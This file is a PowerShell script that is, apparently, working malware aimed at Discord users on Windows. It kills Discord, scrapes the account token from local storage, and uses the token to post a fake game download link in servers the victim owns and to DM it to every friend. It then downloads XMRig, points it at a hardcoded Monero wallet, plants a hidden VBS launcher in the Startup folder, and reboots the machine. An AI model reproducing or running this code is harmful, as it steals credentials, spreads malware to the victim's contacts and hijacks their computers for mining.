# Get Username
$user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
$user = $user.split("\")
$user = $user[1]
$dscp = "C:\Users\$user"+"\AppData\Roaming\discord"

function lockit
{
    $user = [System.Security.Principal.WindowsIdentity]::GetCurrent().Name
    $user = $user.split("\")
    $user = $user[1]
    # Plant miner
    Set-Location -Path "C:\Users\$user\Desktop"
    Invoke-WebRequest -UseBasicParsing -Uri "https://github.com/xmrig/xmrig/releases/download/v6.12.2/xmrig-6.12.2-msvc-win64.zip" -OutFile "xmrig.zip"
    Expand-Archive -LiteralPath "C:\Users\$user\Desktop\xmrig.zip" -DestinationPath "C:\Users\$user\Desktop\"
    Set-Location -Path "C:\Users\$user\Desktop\xmrig-6.12.2"
    $forcon = Get-Content -Path "config.json" | ConvertFrom-Json
    foreach($item in $forcon.pools){
        $item.url = "pool.supportxmr.com:80"
        $item.user = "47t1QC7P7QngT8UVGrLNsF1FLEte2LrLdDTXqS3S9UJBPUqTvfmkc7QFQzV2NMotJvKFAQd6wdDC8C1K218GrQJX7SwtiMp"
    }
    $val = $forcon | ConvertTo-Json
    # Replace old config with new one and move it 
    Remove-Item -Path "config.json"
    Add-Content -Path "config.json" -Value $val
    Set-Location -Path "../"
    Move-Item -Path "xmrig-6.12.2" -Destination "xmrig"
    Move-Item -Path "xmrig" -Destination "../"
    # Drop vbs to startup
    $handle = [char]34
    $value = "Dim WinScriptHost"
    Add-Content -Path  "C:\Users\$user\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\runner.vbs" -Value $value
    $value = "Set WinScriptHost = CreateObject("
    $value += $handle 
    $value += "WScript.Shell"
    $value += $handle
    $value += ")"
    Add-Content -Path  "C:\Users\$user\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\runner.vbs" -Value $value
    $value = "WinScriptHost.Run Chr(34) & "
    $value += $handle
    $value += "C:\Users\"
    $value += $user 
    $value += "\xmrig\xmrig.exe"
    $value += $handle
    $value += " & Chr(34), 0"
    Add-Content -Path  "C:\Users\$user\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\runner.vbs" -Value $value
    $value = "Set WinScriptHost = Nothing"
    Add-Content -Path  "C:\Users\$user\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\runner.vbs" -Value $value
    restart-computer
}
function Request {
    param (
        [string]$url
    )
    $response = Invoke-WebRequest -UseBasicParsin -Uri "$url" -Headers $headers -Method Get
    $response = $response.content | ConvertFrom-Json
    return $response
}
if(Test-Path -Path $dscp){
    # Check if discord is running
    $proc = Get-Process 
    Try{
        foreach ($process in $proc) {
            # If its running kill it
            if($process.ProcessName -eq "Discord"){
                Stop-Process -Id $process.Id -Force
            }
        }
    }Catch{
        Write-Output "Task kill error"
    }
    # Final matches
    $handlearray = @()
    # Paths
    $path = "C:\Users\"+$user+"\AppData\Roaming\discord\Local Storage\leveldb\00*"
    $path2 = "C:\Users\"+$user+"\AppData\Roaming\discord\Cache\data*"
    # Get ids from first path
    $output = Get-Content -Path $path
    $match = [regex]::Matches($output,'\d{18}')
    $handlearray += $match.value
    # Get ids from second path
    $output = Get-Content -Path $path2
    $match2 = [regex]::Matches($output,'\d{18}')
    $handlearray += $match2.value
    # Filter them up
    $finalmatches = $handlearray | Select-Object -Unique
    $matchv1 = $null
    #scrape token
    foreach ($file in Get-ChildItem -Path $path) {
        $output = Get-Content -Path $file | tail
        $matchtoken = [regex]::Match($output,'oken.+[^".+]"')
        while($null -eq $matchv1.Value){
            if($matchtoken.Value -ne ""){
                $matchv1 = $matchtoken.Value
                break
            }
        }
        break
    }
    # Make sure to match token again
    $matchtoken = [regex]::Match($matchv1,'oken.+[^".+]"')
    $tokenparts = $matchtoken.Value.Split(".")
    $tokenidparts = @()
    $stringtokenpart = $tokenparts[0]
    $stringtokenpart = $stringtokenpart.Split('"')
    # Get id so i can estimate userid faster less results more accuarate
    $id_encoded = $stringtokenpart[1]
    $id_encoded_14 = $id_encoded.Substring(0,14)
    $id_encoded_14 += "=="
    $id_decoded_14 = [System.Convert]::FromBase64String($id_encoded_14)
    $con = ''
    foreach ($item in $id_decoded_14) {
        $con += [char]$item
    }
    # Convert every id to base64 (this has to be done cuz sometimes ldb corrupts base64 id part of token)
    $idmatched = ''
    foreach ($id in $finalmatches) {
        if($id.Substring(0,10) -eq $con){
            $byte = [System.Text.Encoding]::UTF8.GetBytes($id)
            $encodedid = [System.Convert]::ToBase64String($byte)
            $fixedid = $encodedid.SubString(0,24)
            
            $idmatched += $id
            $tokenidparts += $fixedid
        }
    }
    foreach ($base64id in $tokenidparts) {
        # combine hman and base64 part into token
        $hmac = $tokenparts[2].Split('"')
        $token = $base64id + "." +  $tokenparts[1] + "." + $hmac[0]
        # headers and api
        $headers = @{"Authorization"=$token}
	    $api = "https://discord.com/api/v8"
        # Test generated token if it works continue else lock it 
	    try{
        	$response = Request -url "$api/users/@me"
	    }catch{
            $_.Exception.Response
            exit
	    }
        # list guilds user is in 
	    $response = Request -url "$api/users/@me/guilds"
        $randomchoice = @()
        # for each server that is user in check if owner id is equal to infected user
        # send message to everyone in server with malichous payload
        foreach($server in $response){
            $id = $server.id
            $response = Request -url "$api/guilds/$id"
            if($response.owner_id -eq $idmatched){
                $response1 = Request -url "$api/guilds/$id/channels"
                foreach ($channel in $response1){
                    if($channel.type -eq "0"){
                        $randomchoice += $channel.id
                    }
                }
                $messageid = Get-Random $randomchoice
                $message_data = @{"content"="@everyone hey guys we been working on this game if you are interested here is download link : https://mega.nz/file/UoBliSiA#7foLu8U9qCXmzUiDRSIjCp_gth6nVurlJhuIISDrApg send your scores to my dms the highest one gets free nitro ;)"}
                Invoke-WebRequest -UseBasicParsing -Uri "$api/channels/$messageid/messages" -Method Post -Headers $headers -Body $message_data
                $randomchoice = @()
            }
        }
        # Get friends
        $response = Request -url "$api/users/@me/relationships"
        # Send private message to every friend
        foreach($user in $response){
            $userid = $user.id
            $headers = @{"Authorization"=$token;"Content-Type"="application/json"}
            $message_data = @{"recipient_id"=$userid} | ConvertTo-Json
            $resp = Invoke-WebRequest -UseBasicParsing -Uri "$api/users/@me/channels" -Method Post -Headers $headers -Body $message_data | ConvertFrom-Json
            $chan_id = $resp.id
            $message_data = @{"content"="hey here is the game you asked for https://mega.nz/file/UoBliSiA#7foLu8U9qCXmzUiDRSIjCp_gth6nVurlJhuIISDrApg"} | ConvertTo-Json
            Invoke-WebRequest -UseBasicParsing -Uri "$api/channels/$chan_id/messages" -Method Post -Headers $headers -Body $message_data
        }
    }
    lockit
}
